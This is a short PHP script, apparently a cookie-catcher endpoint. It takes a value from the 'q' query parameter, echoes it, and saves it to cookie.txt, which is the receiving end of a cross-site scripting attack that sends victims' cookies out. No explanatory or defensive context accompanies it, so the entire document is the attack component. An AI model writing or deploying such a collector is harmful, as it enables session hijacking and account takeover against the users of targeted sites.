<?php 
$cookie = $_GET['q']; 
var_dump($cookie); 
$myfile = fopen("cookie.txt", "w");
fwrite($myfile, $cookie);
?> 